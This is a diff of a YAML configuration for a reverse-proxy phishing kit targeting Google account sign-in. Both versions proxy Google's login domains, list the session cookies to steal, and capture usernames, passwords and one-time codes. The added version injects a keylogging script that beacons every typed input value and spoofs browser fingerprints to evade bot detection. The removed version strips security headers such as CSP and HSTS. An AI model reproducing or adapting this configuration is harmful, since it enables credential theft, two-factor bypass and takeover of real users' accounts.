@@ -1,66 +1,65 @@
-name: "Google-Accounts"
-author: "Vanta v5 Red Team"
-min_ver: "5.0.0"
+name: "google"
+author: "@redteam_expert"
+min_ver: "3.0.0"
 proxy_hosts:
-  - subdomain: "accounts"
-    target: "accounts.google.com"
-  - subdomain: "ssl"
-    target: "ssl.gstatic.com"
-  - subdomain: "www"
-    target: "www.google.com"
-  - subdomain: "apis"
-    target: "apis.google.com"
-auth_urls: 
-  - "/signin/v2/identifier"
-  - "/ServiceLogin"
-  - "/v3/signin/identifier"
-landing_path: 
-  - "/signin/v2/identifier"
-  - "/ServiceLogin"
+  - {phish_sub: "accounts", orig_sub: "accounts", domain: "google.com", session: true, is_landing: true}
+  - {phish_sub: "ssl", orig_sub: "ssl", domain: "gstatic.com", session: false, is_landing: false}
+  - {phish_sub: "www", orig_sub: "www", domain: "google.com", session: false, is_landing: false}
+  - {phish_sub: "apis", orig_sub: "apis", domain: "google.com", session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
+  - {triggers_on: "ssl.gstatic.com", orig_sub: "ssl", domain: "gstatic.com", search: "https://{hostname}/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
 auth_tokens:
-  - {type: "cookie", name: "SID"}
-  - {type: "cookie", name: "HSID"}
-  - {type: "cookie", name: "SSID"}
-  - {type: "cookie", name: "APISID"}
-  - {type: "cookie", name: "SAPISID"}
-  - {type: "cookie", name: "__Secure-1PSID"}
-  - {type: "cookie", name: "__Secure-3PSID"}
-  - {type: "cookie", name: "__Secure-1PAPISID"}
-  - {type: "cookie", name: "__Secure-3PAPISID"}
-  - {type: "cookie", name: "NID"}
-  - {type: "cookie", name: "GAPS"}
-  - {type: "cookie", name: "LSID"}
+  - domain: ".google.com"
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID", "__Secure-3PAPISID", "NID", "GAPS", "LSID", "SIDCC", "__Host-GAPS"]
+  - domain: "accounts.google.com"
+    keys: ["SID", "HSID", "SSID", "APISID", "SAPISID", "__Secure-1PSID", "__Secure-3PSID", "__Secure-1PAPISID", "__Secure-3PAPISID", "NID", "GAPS", "LSID", "SIDCC", "__Host-GAPS"]
 credentials:
-  - {type: "post_param", name: "identifier", regex: null}
-  - {type: "post_param", name: "password", regex: null}
-  - {type: "post_param", name: "Email", regex: null}
-  - {type: "post_param", name: "Passwd", regex: null}
-  - {type: "post_param", name: "f.req", regex: null}
-injections:
-  - trigger_path: "/signin"
-    position: "body_end"
-    content: |
+  username:
+    key: "identifier"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+  2fa:
+    key: "otp"
+    search: "(.*)"
+    type: "post"
+login:
+  domain: "accounts.google.com"
+  path: "/signin/v2/identifier"
+js_inject:
+  - trigger_domains: ["accounts.google.com"]
+    trigger_paths: ["/signin/v2/identifier", "/ServiceLogin"]
+    script: |
       (function(){
-        // Google Anti-Bot Evasion
+        // Anti-Bot: Mock user behavior
         Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
-        // Mock Plugins
         Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
-        // Disable right-click for security
-        document.addEventListener('contextmenu', event => event.preventDefault());
+        Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+        
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        setInterval(() => {
+           const ev = new MouseEvent('mousemove', {
+               view: window, bubbles: true, cancelable: true, 
+               clientX: Math.random() * window.innerWidth, clientY: Math.random() * window.innerHeight
+           });
+           document.dispatchEvent(ev);
+        }, 3000);
+        
+        // Input Capture
+        document.addEventListener('input', function(e) {
+            if(e.target.tagName === 'INPUT') {
+                 // Send to Beacon
+                 if(window.navigator.sendBeacon) {
+                    const data = new FormData();
+                    data.append('k', e.target.value);
+                    data.append('f', e.target.name || e.target.id);
+                    window.navigator.sendBeacon('/__vanta_track', data);
+                 }
+            }
+        });
       })();
-headers:
-  - {action: "remove", name: "Content-Security-Policy"}
-  - {action: "remove", name: "X-Frame-Options"}
-  - {action: "remove", name: "X-Content-Type-Options"}
-  - {action: "remove", name: "Strict-Transport-Security"}
-path_rewrites:
-  - {pattern: "^/$", replace: "/signin/v2/identifier", methods: ["GET"]}
-cookie_rewrites: []
-blocklist:
-  - {pattern: "analytics|gtm|google-analytics|/log|/playlog", mimes: ["text/javascript"], max_kb: 512}
-form_actions:
-  - {selector: "form[action*=\"ServiceLogin\"], form[action*=\"signin\"]", action_to: "/session/login"}
-bridges:
-  - {prefix: "/_gapi/", target_host: "apis.google.com", strip_prefix: true, cors: "allow_all"}
-  - {prefix: "/_gstatic/", target_host: "ssl.gstatic.com", strip_prefix: true, cors: "allow_all"}
-  - {prefix: "/_play/", target_host: "play.google.com", strip_prefix: true, cors: "allow_all"}
+
